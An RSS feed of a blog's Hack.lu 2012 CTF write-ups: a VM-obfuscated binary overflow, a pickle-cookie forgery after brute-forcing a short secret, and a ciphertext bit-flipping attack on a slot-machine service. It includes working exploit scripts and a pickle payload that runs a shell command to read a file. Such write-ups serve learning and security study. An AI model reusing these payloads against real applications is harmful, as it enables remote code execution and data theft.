<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: 2012</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>[writeup] Hacklu 2012 – Challenge #6 – BrainGathering – (500)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/26/writeup-hacklu-2012-challenge-6-braingathering-500.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-26T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/26/writeup-hacklu-2012-challenge-6-braingathering-500.html</guid>
  <description><![CDATA[
     <p>I did not solve this during CTF and my mistake is not using IDA to decompile since it has some obfuscate.<br />
After CTF end, i use gdb to dump running process to binary file and<br />
analyze it again, try to finish it.</p>

<blockquote>
  <p>gdb –pid [PID]<br />
gdb&gt;info proc<br />
process 4660</p>

  <p>gdb&gt;shell cat /proc/4660/maps<br />
08048000-0804a000 rwxp 00000000 08:03 7213513</p>

  <p>gdb&gt;dump out.dmp 0×08048000 0x0804a000</p>
</blockquote>

<p>Load it to IDA and decompile. Basically it will loop and get an OPCODE<br />
from static array locate at address 0x804B060, and a action defined<br />
by that OPCODE will be run.</p>

<p>Just thinking a bit, when we input 0×36 bytes it will end up with a message:</p>

<blockquote>
  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>3<br />
### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br />
XPLOIT DETECTED, ALTERING KILLCODE</p>
</blockquote>

<p>In normal case when our string &lt; 0×36 bytes length:</p>

<blockquote>
  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>3<br />
### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
hello<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready</p>
</blockquote>

<p>It continue. So i think it must be a different when this vm handle<br />
our string. The execution flow will different in 2 cases. Let find out:</p>

<p>I set a breakpoint and print at 0x0804865B where it get OPCODE and put it<br />
in to EAX register.</p>

<blockquote>
  <p>b *0x0804865B<br />
commands 1<br />
p/x $ebx<br />
p/x $eax<br />
continue<br />
end</p>
</blockquote>

<p>Compare 2 results I have found where the execution alter:</p>

<p>First one is “B”*0×36:</p>

<blockquote>
  <p>0x081ea147 71<br />
0x081ea148 82<br />
0x081ea149 14<br />
0x081ea14a 53<br />
0x081ea14d 81<br />
0x081ea14e 40<br />
0x081ea150 74<br />
0x081ea151 41<br />
0x081ea152 86<br />
0x081ea153 68<br />
0x081ea154 74<br />
0x081ea155 58<br />
0x081ea4f3 3d<br />
0x081ea4f6 81<br />
0x081ea4f7 3f<br />
0x081ea4f9 53<br />
0x081ea4fc 28</p>
</blockquote>

<p>In normal case:</p>

<blockquote>
  <p>0×08515147 71<br />
0×08515148 82<br />
0×08515149 14<br />
0x0851514a 53<br />
0x0851514d 81<br />
0x0851514e 40<br />
0×08515150 74<br />
0×08515151 41<br />
0×08515152 86<br />
0×08515153 68<br />
0×08515154 74<br />
0×08515155 58<br />
0x0851531d 58<br />
0×08519149 53<br />
0x0851914c 53<br />
0x0851914f 53<br />
0×08519152 53</p>
</blockquote>

<p>The address in 2 case will same at offset, so we can compare easy.<br />
It start different when handle OPCODE 0×58.</p>

<blockquote>
  <p>case 0×58:<br />
v22 = *heap1_end2;<br />
++heap1_end2;<br />
PC += v22;<br />
continue;</p>
</blockquote>

<p>So v22 will change flow of execution because. I want to know why this happen:</p>

<blockquote>
  <p>gdb&gt;b *0x080487DE<br />
gdb&gt;commands 2<br />
&gt;p/x $ebx<br />
&gt;continue<br />
&gt;end</p>
</blockquote>

<p>And i end up with</p>

<blockquote>
  <p>…<br />
..<br />
Breakpoint 2, 0x080487de in close@plt ()<br />
$12 = 0×4242</p>
</blockquote>

<p>Yeah, so we can control v22. Let look into hex-rays source to see why this happen:</p>

<p>In OPCODE 0x3F</p>

<blockquote>
  <p>case 0x3F:<br />
v40 = *PC++;<br />
v41 = v4;<br />
READ(v40, &amp;PC[v61], 0xFFFF – (unsigned __int16)((_WORD)heap1_end2 – (_WORD)PC));<br />
v4 = v41;<br />
continue;</p>
</blockquote>

<p>It will read our string to PC[v61] with a size result from calculation: 0xFFFF – (unsigned __int16)((_WORD)heap1_end2 – (_WORD)PC)<br />
Since result from v22 we can understand an overflow occur, last 2 bytes of our string overwrite value at heap1_end2.<br />
When OPCODE 0×58 is processed, PC will increase base on that 2 bytes.</p>

<p>Now the time for exploitation, first we need to calculate offset beetween PC at that time and our string.</p>

<blockquote>
  <p>gdb&gt;b *0x080487DE if $ebx=0×4242<br />
gdb&gt;c<br />
…..<br />
gdb&gt;x/20wx $edi-0×40<br />
0x8343fb5: 0×00000000 0×00000000 0×00000000 0×00000000<br />
0x8343fc5: 0x700e4242 0×00007010 0×00000000 0×42424242<br />
0x8343fd5: 0×42424242 0×42424242 0×42424242 0×42424242<br />
0x8343fe5: 0×42424242 0×00104242 0x7000ffc9 0x01e38010<br />
0x8343ff5: 0×42424242 0×42424242 0×42424242 0×42424242<br />
gdb&gt; x/x $esp+0x2c<br />
0xffe8648c: 0×08334008<br />
gdb&gt; p/x 0x8343fd5-0×08334008<br />
$5 = 0xffcd</p>
</blockquote>

<p>So just to confirm i’ll return to 0×40 ( write OPCODE) :</p>

<blockquote>
  <p>python -c ‘print “3″*34+”x40″*41+”xffxcd”*7′ &gt; file</p>
</blockquote>

<p>And:</p>

<blockquote>
  <p>./braingathering &lt; file<br />
==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
INVALID<br />
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz</p>
</blockquote>

<p>And make sure index of byte we can start our shellcode:</p>

<blockquote>
  <p>python -c ‘print “3″*34+”A”*6+”x40″+”B”*34+”xffxcd”*7′ &gt; file<br />
./braingathering &lt; file<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>INVALID</p>
</blockquote>

<p>In OPCODE 0×40:</p>

<blockquote>
  <p>case 0×40:<br />
v36 = *PC++;<br />
v37 = 2;<br />
v63 = v4;<br />
if ( v36 &lt;= 1u )<br />
v37 = v36;<br />
v38 = v37;<br />
len = STRLEN(&amp;PC[v61]);<br />
WRITE(v38, &amp;PC[v61], len);<br />
v4 = v63;<br />
continue;</p>
</blockquote>

<p>Finally. We findout where content of killcode existence in memory.<br />
Let find where it is:</p>

<blockquote>
  <p>gdb-peda$ searchmem KILLCODE heap<br />
Searching for ‘KILLCODE’ in: heap ranges<br />
Found 1 results, display max 1 items:<br />
[heap] : 0x838b008 (“KILLCODEn## Warn”)<br />
gdb-peda$ p/x 0x838b008-0×08383008<br />
$1 = 0×8000</p>
</blockquote>

<p>And we need to reset v61 to 0×8000 We use OPCODE 0×49</p>

<blockquote>
  <p>case 0×49:<br />
v29 = PC[1];<br />
v30 = *PC;<br />
PC += 2;<br />
v61 = (v29 « 8) | v30;<br />
continue;</p>
</blockquote>

<p>And final exploit ( so lucky since v61 has value 0 at that time)</p>

<blockquote>
  <p>$echo “FUKCING KILLCODE” &gt; killcode</p>

  <p>$python -c ‘print “3″*34+”A”*6+”x49x00x80x40″+”B”*31+”xffxcd”*7′ &gt; file<br />
./braingathering &lt; file<br />
==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
Automated system for braingathering ready.</p>

  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
2) How much longer till braaaiiiiinz?<br />
3) Nooo more brainz! STOP THE BRAINZ!</p>

  <p>X) Nah, I’m going to get my brains somewhere else.</p>

  <p>### Warning: Only for authorized zombies ###<br />
Please enter teh z0mb13 k1llc0d3:<br />
Comparing k1llc0d3<br />
INVALID</p>

  <p>FUKCING KILLCODE</p>
</blockquote>

<p>and hex-rays source:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80485E0()
{
  BYTE *PC; // esi@1 MAPDST
  int index; // eax@1
  _WORD *heap1_end2; // edi@3
  int v4; // edx@3
  char opCode; // al@4
  int v6; // ST3C_4@5
  unsigned __int16 v7; // ax@6
  int v8; // eax@11
  int v9; // esi@12
  __int16 v10; // si@15
  __int16 v11; // ax@15
  char v12; // si@16
  int v13; // ecx@16
  unsigned __int16 v14; // cx@19
  char v15; // si@23
  int v16; // eax@23
  unsigned __int16 v17; // si@26
  __int16 v18; // si@27
  __int16 v19; // ax@27
  char v20; // si@30
  int v21; // eax@30
  int v22; // ebx@33
  __int16 v23; // si@36
  __int16 v24; // ax@36
  __int16 v25; // si@37
  __int16 v26; // ax@37
  __int16 v27; // si@38
  __int16 v28; // cx@38
  __int16 v29; // ax@39
  __int16 v30; // cx@39
  __int16 v31; // si@45
  __int16 v32; // ax@45
  int v33; // ST3C_4@47
  int v34; // ST3C_4@48
  unsigned __int16 v35; // ax@48
  unsigned __int16 v36; // si@50
  signed int v37; // eax@50
  signed int v38; // ST40_4@52
  int len; // eax@52
  unsigned __int16 v40; // si@53
  int v41; // ST3C_4@53
  __int16 v42; // si@54
  unsigned __int16 v43; // ax@54
  __int16 v44; // si@55
  __int16 v45; // ax@55
  __int16 v46; // si@57
  __int16 v47; // ax@57
  BYTE v48; // si@59
  int v49; // ecx@59
  int v50; // eax@63
  __int16 v51; // si@67
  unsigned __int16 v52; // ax@67
  BYTE v53; // si@77
  int v54; // ecx@77
  __int16 v55; // si@80
  __int16 v56; // ax@80
  char v57; // si@82
  int v58; // eax@82
  int v59; // eax@85
  unsigned __int16 v61; // [sp+1Eh] [bp-42h]@3
  int v63; // [sp+3Ch] [bp-24h]@50
  BYTE *heap1_end1; // [sp+44h] [bp-1Ch]@3
  unsigned __int16 v65; // [sp+48h] [bp-18h]@3
  unsigned __int16 v66; // [sp+4Ah] [bp-16h]@3

  PC = (BYTE *)malloc_(65535);
  memset_((int)PC, 0, 65535);
  index = 0;
  do
  {
    PC[index] = byte_804B060[index];
    ++index;
  }
  while ( index != 2068 );
  heap1_end1 = PC + 65535;
  heap1_end2 = PC + 65535;
  v4 = 0;
  v65 = 0;
  v66 = 0;
  v61 = 0;
  while ( 1 )
  {
    opCode = *PC++;
    switch ( opCode )
    {
      default:
        continue;
      case 0x90:
        v6 = v4;
        sleep_();
        v4 = v6;
        continue;
      case 0x86:
        v7 = *heap1_end2;
        ++heap1_end2;
        v65 = v7;
        continue;
      case 0x82:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = v65;
        continue;
      case 0x81:
        v61 = (_WORD)heap1_end2 - (_WORD)PC;
        continue;
      case 0x7B:
        v8 = v4 &amp; 0x1FFF;
        if ( v66 == v65 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v65 = v66;
        }
        else
        {
          HIWORD(v9) = HIWORD(v4);
          LOWORD(v4) = v8 | 0x8000;
          if ( v66 &gt;= v65 )
          {
            LOWORD(v9) = v8 | 0x4000;
            v4 = v9;
          }
        }
        continue;
      case 0x79:
        v10 = PC[1];
        v11 = *PC;
        PC += 2;
        v65 -= (v10 &lt;&lt; 8) | v11;
        continue;
      case 0x75:
        v12 = *PC++;
        v13 = v4 | 0x8000;
        LOWORD(v4) = v4 &amp; 0x7FFF;
        if ( v12 )
          v4 = v13;
        continue;
      case 0x74:
        v14 = *heap1_end2;
        ++heap1_end2;
        v61 = v14;
        continue;
      case 0x71:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = v66;
        continue;
      case 0x69:
        v15 = *PC++;
        v16 = v4 | 0x40;
        v4 &amp;= 0xFFFFFFBFu;
        if ( v15 )
          v4 = v16;
        continue;
      case 0x68:
        v17 = *heap1_end2;
        ++heap1_end2;
        v66 = v17;
        continue;
      case 0x66:
        v18 = PC[1];
        v19 = *PC;
        PC += 2;
        v66 = (v18 &lt;&lt; 8) | v19;
        continue;
      case 0x61:
        v61 ^= (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
        goto LABEL_29;
      case 0x5C:
        v20 = *PC++;
        v21 = v4 | 0x20;
        v4 &amp;= 0xFFFFFFDFu;
        if ( v20 )
          v4 = v21;
        continue;
      case 0x58:
        v22 = *heap1_end2;
        ++heap1_end2;
        PC += v22;
        continue;
      case 0x53:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        v23 = PC[1];
        --heap1_end2;
        v24 = *PC;
        PC += 2;
        *heap1_end2 = (v23 &lt;&lt; 8) | v24;
        continue;
      case 0x4F:
        v25 = PC[1];
        v26 = *PC;
        PC += 2;
        v61 += (v25 &lt;&lt; 8) | v26;
        continue;
      case 0x4B:
        v27 = PC[1];
        v28 = *PC;
        PC += 2;
        v65 = (v27 &lt;&lt; 8) | v28;
        continue;
      case 0x49:
        v29 = PC[1];
        v30 = *PC;
        PC += 2;
        v61 = (v29 &lt;&lt; 8) | v30;
        continue;
      case 0x47:
        if ( (v4 &amp; 0x2010) == 8208 || v4 &amp; 0x40 &amp;&amp; (unsigned __int16)v4 &gt;&gt; 15 || (v4 &amp; 0x4020) == 16416 )
          PC += *PC | (PC[1] &lt;&lt; 8);
        else
LABEL_29:
          PC += 2;
        continue;
      case 0x45:
        v31 = PC[1];
        v32 = *PC;
        PC += 2;
        v65 += (v31 &lt;&lt; 8) | v32;
        continue;
      case 0x43:
        if ( v61 &gt; 2u )
        {
          v33 = v4;
          close_(v61);
          v4 = v33;
        }
        continue;
      case 0x42:
        v34 = v4;
        v35 = OPEN(&amp;PC[v61], 0);
        v4 = v34;
        v61 = v35;
        continue;
      case 0x41:
        v4 = *heap1_end2;
        ++heap1_end2;
        continue;
      case 0x40:
        v36 = *PC++;
        v37 = 2;
        v63 = v4;
        if ( v36 &lt;= 1u )
          v37 = v36;
        v38 = v37;
        len = STRLEN(&amp;PC[v61]);
        WRITE(v38, &amp;PC[v61], len);
        v4 = v63;
        continue;
      case 0x3F:
        v40 = *PC++;
        v41 = v4;
        READ(v40, &amp;PC[v61], 0xFFFF - (unsigned __int16)((_WORD)heap1_end2 - (_WORD)PC));
        v4 = v41;
        continue;
      case 0x3D:
        v42 = PC[1];
        v43 = *PC;
        PC += 2;
        heap1_end2 = (char *)heap1_end2 - ((unsigned __int16)(v42 &lt;&lt; 8) | v43);
        continue;
      case 0x3A:
        v44 = PC[1];
        v45 = *PC;
        PC += 2;
        v61 -= (v44 &lt;&lt; 8) | v45;
        continue;
      case 0x39:
        v61 += v66;
        continue;
      case 0x36:
        v46 = PC[1];
        v47 = *PC;
        PC += 2;
        v66 += (v46 &lt;&lt; 8) | v47;
        continue;
      case 0x33:
        v66 = (_WORD)heap1_end2 - (_WORD)PC;
        continue;
      case 0x31:
        v48 = *PC;
        v49 = v4;
        ++PC;
        BYTE1(v49) |= 0x20u;
        BYTE1(v4) &amp;= 0xDFu;
        if ( v48 )
          v4 = v49;
        continue;
      case 0x30:
        *(_WORD *)&amp;PC[v61] = v66;
        continue;
      case 0x2C:
        v50 = v4 &amp; 0x1FFF;
        if ( v61 == v65 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v65 = v61;
        }
        else
        {
          LOWORD(v4) = v50 | 0x8000;
          BYTE1(v50) |= 0x40u;
          if ( v61 &gt;= v65 )
            v4 = v50;
        }
        continue;
      case 0x28:
        v51 = PC[1];
        v52 = *PC;
        PC += 2;
        heap1_end2 = (char *)heap1_end2 + ((unsigned __int16)(v51 &lt;&lt; 8) | v52);
        continue;
      case 0x27:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
          goto terminate_;
        --heap1_end2;
        *heap1_end2 = (_WORD)PC + 2 - (_WORD)PC;
        PC += (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
        break;
      case 0x25:
        v61 -= v66;
        break;
      case 0x24:
        v65 = (_WORD)heap1_end2 - (_WORD)PC;
        break;
      case 0x21:
        v61 = *(_WORD *)&amp;PC[v66];
        break;
      case 0x20:
        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
        {
terminate_:
          put_("VM PROTECTION FAIL, TERMINATING");
          exit_(1);
        }
        --heap1_end2;
        *heap1_end2 = v61;
        break;
      case 0x17:
        v53 = *PC;
        v54 = v4;
        ++PC;
        BYTE1(v54) |= 0x40u;
        BYTE1(v4) &amp;= 0xBFu;
        if ( v53 )
          v4 = v54;
        break;
      case 0x16:
        v55 = PC[1];
        v56 = *PC;
        PC += 2;
        v66 -= (v55 &lt;&lt; 8) | v56;
        break;
      case 0x14:
        --heap1_end2;
        *heap1_end2 = v4;
        break;
      case 0xD:
        v57 = *PC++;
        v58 = v4 | 0x10;
        v4 &amp;= 0xFFFFFFEFu;
        if ( v57 )
          v4 = v58;
        break;
      case 0xA:
        v59 = v4 &amp; 0x1FFF;
        if ( v61 == v66 )
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v4) |= 0x20u;
          v66 = v61;
        }
        else
        {
          v4 &amp;= 0x1FFFu;
          BYTE1(v59) |= 0x40u;
          LOWORD(v4) = v4 | 0x8000;
          if ( v66 &lt;= v61 )
            v4 = v59;
        }
        break;
      case 0xFF:
        return 0;
    }
  }
}
</pre>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 &#8211; Challenge #19 &#8211; Zombie Reminder &#8211; (200)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-19-zombie-reminder-200.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-19-zombie-reminder-200.html</guid>
  <description><![CDATA[
     <blockquote>
  <p>19 – Zombie Reminder<br />
Zombies love brains. But zombies forget, so they have a tool where they can enter the location of brains they found. In a heroic mission someone managed to obtain both the source code and the information that a critical file can be found at ‘/var/www/flag’.<br />
Your mission is to obtain the contents of this file by any means and avenge your fallen friend!<br />
Service: https://ctf.fluxfingers.net:2073/<br />
Source: https://ctf.fluxfingers.net/challenges/zombie_reminder.py</p>
</blockquote>

<p>This challenge is a web application returning an arbitrary text that inputed by you previously. Your input is stored in “location” cookie with format of “<strong>&lt;hash_digest&gt;!&lt;encoded_input&gt;</strong>” where:</p>

<ul>
  <li>encoded_input = base64_encode(pickle.dumps(your_input))</li>
  <li>hash_digest = sha256(encoded_input+secret_key)</li>
</ul>

<p>When you go back to the main page, if a valid cookie is set the application will load the pickle object from cookie and print it out.&lt;/p&gt; &lt;pre class="brush: plain; title: ; notranslate" title=""&gt;location = pickle.loads(b64d(location))
&lt;/pre&gt;</p>

<p>The purpose of hash_digest is to ensure that your_input is a <strong>string</strong> submitted through challenge’s web form. However this design has 2 major flaws:</p>

<ul>
  <li>secret_key is too short (5 characters)</li>
  <li>pickle has a known security issue (<a href="http://nadiana.com/python-pickle-insecure">http://nadiana.com/python-pickle-insecure</a>)</li>
</ul>

<p>We submit a random string (let’s say “test”) and look at the cookie:<br />
location=”04b098d726754c810c65595a82dd42a9564ce332fd51c0da2a43bbdd42a91f37!VnRlc3QKcDAKLg==”</p>

<p>We use this script to bruteforce the secret key :</p>

<pre class="brush: plain; title: ; notranslate" title="">#!/usr/bin/env python

import multiprocessing
from hashlib import *
import string
import sys

s = string.ascii_letters + string.digits
location = "VnRlc3QKcDAKLg=="
digest = "04b098d726754c810c65595a82dd42a9564ce332fd51c0da2a43bbdd42a91f37"

print len(s)

WORKERS    = 8

def worker(start,end):

    for i1 in s[start:end]:
        for i2 in s:
            for i3 in s:
                for i4 in s:
                    for i5 in s:
                        secret  = i1+i2+i3+i4+i5

                        if sha256("%s%s" % (location, secret)).hexdigest() == digest:
                            print "*******", secret
                            sys.exit(0)

def main():

    ps = []
    for i in range(WORKERS):
        if i == WORKERS -1:
            tmp = multiprocessing.Process(target=worker, args=(i*(len(s)/WORKERS),len(s),))
        else:
            tmp = multiprocessing.Process(target=worker, args=(i*(len(s)/WORKERS),(i+1)*(len(s)/WORKERS),))
        tmp.start()
        ps.append(tmp)

    for p in ps:
        p.join()

    return jobs.empty()

if __name__ == '__main__':
    main()
</pre>

<p>After a few minutes we managed to find the key <strong>oIqxe</strong>. Our next task is to build a pickled representation of a python code object, the goal is to execute a code similar to this when pickle.loads() is called:</p>

<pre class="brush: plain; title: ; notranslate" title="">__import__("commands").getoutput("cat /var/www/flag")
</pre>

<p>This code is used to generate such serialized string:</p>

<pre class="brush: plain; title: ; notranslate" title="">import pickle, new

def nasty(module, function, *args):
        return pickle.dumps(new.classobj(function, (), {'__getinitargs__': lambda self, arg = args: arg, '__module__': module}) ())

t = nasty("commands", "getoutput", "cat /var/www/flag")

print repr(t)

# Output: "(S'cat /var/www/flag'np1nicommandsngetoutputnp2n(dp3nb."
</pre>

<p>Now we have everything to get the flag, time to build a valid cookie:</p>

<pre class="brush: plain; title: ; notranslate" title="">from hashlib import sha256
import base64
b64e=base64.b64encode

secret = 'oIqxe'
location = b64e("(S'cat /var/www/flag'np1nicommandsngetoutputnp2n(dp3nb.")

cookie = "%s!%s" % (sha256("%s%s" % (location, secret)).hexdigest(), location)

print cookie
</pre>

<p>Place this cookie into your browser (don’t ask us how to do that lolz) and refresh, the flag will be right on the screen.</p>

<blockquote>
  <p>Hello, here is what we remember for you. If you want to change, delete or extend it, click below<br />
08ac40047dae3f6a36471d768dfcb1b7a8e18fb8</p>
</blockquote>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 &#8211; Challenge #10 (500)</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-10-500.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-challenge-10-500.html</guid>
  <description><![CDATA[
     <blockquote>
  <p>10 – zlotpy<br />
Gambling time. Play against the Internet Zlot Machine at ctf.fluxfingers.net tcp/2053 This challenge has two stages.</p>

  <p>1) Medium: Investigate the contents of a saved game.</p>

  <p>2) Hard: Get 8 (EIGHT) bonus points. Good luck! Hint: We have some sourcecode for you! https://ctf.fluxfingers.net/challenges/zlot.py</p>
</blockquote>

<p>At the first sight, we thought this challenge was about Padding Oracle, but it turned out that Bit Flipping attack should be enough to solve.<br />
First step is to send ‘S’ and get back the ciphertext representing current game state</p>

<blockquote>
  <p>Welcome to the Internet ZlotMachine. Enter ‘T’ for the Tutorial.<br />
Your current balance is 5 credits and 1 bonus<br />
S<br />
Your games has been saved! Please write down the following save game code.<br />
WVIagr4eWOGCHi/CSQg1oKEgZneHnJJIm5LJjJeacngsTG1hm9jfygT6ZpBrsFihNKoef165OP2pb+tacn+9FlV+CfKjelFHS4MykxpJcYk=<br />
This game may later be loaded with L</p>
</blockquote>

<p>If we send this cipher back to the server, it will return <strong>“Your current balance is 5 credits and 1 bonus”</strong></p>

<p>The code below will loop throuth each byte of the cipher text, increase the value by one and ask the server to load that newly created gamestate.</p>

<pre class="brush: python; title: ; notranslate" title="">s = socket(AF_INET, SOCK_STREAM)
s.connect(("ctf.fluxfingers.net",2053))
s.recv(1024)&lt;/code&gt;

responses = set()

def send_request(data):
    try:
        s.send("L"+data+"n")
    except:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("ctf.fluxfingers.net",2053))
        s.recv(1024)
        s.send("L"+data+"n")&lt;/code&gt;

    r = s.recv(1024)

    if r not in responses:
        responses.add(r)
        print r

orig_cipher = base64.b64decode("mzIbwjPTw6hMVcp5DsRZGJykuaWXYaukFOEvUT5xVFLfjqQahbCTNsjXYYUawNEc+XFBV689Y/LPD8YYqKy+Z4DqS1uh9yva1ICjyphYbC8=")
fake_cipher = orig_cipher
l = len(orig_cipher)
for i in range(l):
    print "Try with character #%d"%i
    fake_cipher = set_byte(orig_cipher, i, chr((ord(fake_cipher[i])+1)%256) )
    send_request(base64.b64encode(fake_cipher))
</pre>

<p>The response will look like this:</p>

<blockquote>
  <p>Try with character #9<br />
Try with character #10<br />
Restored state.<br />
Your current balance is 5 credits and 0 bonus</p>

  <p>Try with character #11<br />
Error loading game: Expecting , delimiter: line 1 column 11 (char 11)</p>
</blockquote>

<p>Looking at the result, we notice that changing value of byte #10 will cause the bonus value changed.<br />
Now we simply brute the value of this byte until getting the flag:</p>

<pre class="brush: python; title: ; notranslate" title="">orig_cipher = base64.b64decode("mzIbwjPTw6hMVcp5DsRZGJykuaWXYaukFOEvUT5xVFLfjqQahbCTNsjXYYUawNEc+XFBV689Y/LPD8YYqKy+Z4DqS1uh9yva1ICjyphYbC8=")
fake_cipher = orig_cipher
l = len(orig_cipher)
for i in range(256):
    index = 10
    fake_cipher = set_byte(fake_cipher, index, chr((ord(fake_cipher[index])+i)%256) )
    send_request(base64.b64encode(fake_cipher))
</pre>

<p>We will see the flag after a few minutes:</p>

<blockquote>
  <p>Restored state.<br />
Your current balance is 5 credits and 5 bonus</p>

  <p>Restored state.<br />
Your current balance is 5 credits and 8 bonus<br />
Nice one. Here’s your flag: 9eef8f17d07c4f11febcac1052469ab9</p>
</blockquote>

  ]]></description>
</item>

	<item>
  <title>[writeup] Hacklu 2012 – Challenge #13 &#8211; The Sandbox Terminal</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-13.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-13.html</guid>
  <description><![CDATA[
     <p><strong>Solved by w00d @ clgt<br />
***Thanks **g4mm4</strong> for giving many suggestions and draft the first version of the exploit<br />
*</p>

<blockquote>
  <p>13 – The Sandboxed Terminal (400)</p>

  <p>Since the zombie apocalypse started people did not stop to ask themselves how the whole thing began. An abandoned military base may lead to answers but after infiltrating the facility you find yourself in front of a solid steel door with a computer attached. Luckily this terminal seems to connect to a Python service on a remote server to reduce load on the small computer. While your team managed to steal the source, they need your Python expertise to hack this service and get the masterkey which should be stored in a file called key.</p>

  <p>https://ctf.fluxfingers.net:2076/c7238e81667a085963829e452223b47b/sandbox.py</p>
</blockquote>

<p>In this ctf, I bumped into a few python challenges. Though having been using it for a while, I’m still a novice and pretty much ill-prepared, it took me a lot of time to read articles about python security. There are many interesting ones which I might write in a separate blog, however they do not help me much to solve this challenge, the only thing they help is to keep me motivated.</p>

